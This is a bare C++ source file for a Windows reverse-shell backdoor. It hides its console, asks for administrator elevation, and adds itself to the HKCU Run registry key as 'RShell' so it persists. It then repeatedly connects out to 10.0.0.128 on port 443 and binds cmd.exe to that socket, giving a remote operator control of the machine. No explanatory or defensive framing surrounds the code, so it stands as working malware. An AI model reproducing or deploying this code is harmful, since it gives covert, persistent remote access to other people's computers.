#define _WINSOCK_DEPRECATED_NO_WARNINGS
#define _CRT_SECURE_NO_WARNINGS

#include <WinSock2.h>
#include <Windows.h>
#include <WS2tcpip.h>
#include <iostream>

#pragma comment(lib, "Ws2_32.lib")

void RunShell(const char* target, int port)
{
	while (true)
	{
		Sleep(5000);
		SOCKET socket;
		sockaddr_in addr;
		WSADATA wsa;

		WSAStartup(MAKEWORD(2, 2), &wsa);
		socket = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, NULL, NULL);

		addr.sin_family = AF_INET;
		addr.sin_addr.s_addr = inet_addr(target);
		addr.sin_port = htons(port);

		if (WSAConnect(socket, (sockaddr*)&addr, sizeof(addr), NULL, NULL, NULL, NULL) == SOCKET_ERROR)
		{
			closesocket(socket);
			WSACleanup();
			continue;
		}

		char recvData[1024];
		ZeroMemory(recvData, sizeof(recvData));
		int recvCode = recv(socket, recvData, 1024, NULL);

		if (recvCode <= 0)
		{
			closesocket(socket);
			WSACleanup();
			continue;
		}

		char process[] = "cmd.exe";
		STARTUPINFOA sa;
		PROCESS_INFORMATION pi;

		ZeroMemory(&sa, sizeof(sa));
		ZeroMemory(&pi, sizeof(pi));

		sa.cb = sizeof(sa);
		sa.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
		sa.hStdInput = sa.hStdOutput = sa.hStdError = (HANDLE)socket;

		CreateProcessA(NULL, process, NULL, NULL, true, 0, NULL, NULL, &sa, &pi);
		WaitForSingleObject(pi.hProcess, INFINITE);

		CloseHandle(pi.hThread);
		CloseHandle(pi.hProcess);

		ZeroMemory(recvData, sizeof(recvData));
		recvCode = recv(socket, recvData, 1024, NULL);
		if (recvCode <= 0)
		{
			closesocket(socket);
			WSACleanup();
			continue;
		}

		if (strcmp(recvData, "exit"))
		{
			closesocket(socket);
			WSACleanup();
			break;
		}
	}
}

void MakeAutoRun()
{
	HKEY hKey;
	LSTATUS status;

	status = RegOpenKeyEx(HKEY_CURRENT_USER, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_ALL_ACCESS, &hKey);
	if (status != ERROR_SUCCESS)
	{
		exit(-1);
	}

	WCHAR path[MAX_PATH];
	GetModuleFileName(NULL, path, MAX_PATH);

	status = RegSetKeyValue(hKey, NULL, L"RShell", REG_SZ, path, sizeof(path));
	if (status != ERROR_SUCCESS)
	{
		exit(-1);
	}
}

bool IsElevated()
{
	bool is = false;
	HANDLE hToken;
	TOKEN_ELEVATION elve;
	DWORD cb = sizeof(TOKEN_ELEVATION);

	OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken);
	GetTokenInformation(hToken, TokenElevation, &elve, sizeof(elve), &cb);

	is = elve.TokenIsElevated;

	CloseHandle(hToken);
	return is;
}

void RunAsAdmin()
{
	WCHAR path[MAX_PATH];
	GetModuleFileName(NULL, path, MAX_PATH);

	ShellExecute(NULL, L"runas", path , NULL, NULL, 0);
}

int main()
{
	FreeConsole();
	
	if (!IsElevated())
	{
		RunAsAdmin();
	}

	MakeAutoRun();
	RunShell("10.0.0.128", 443);

	return 0;
}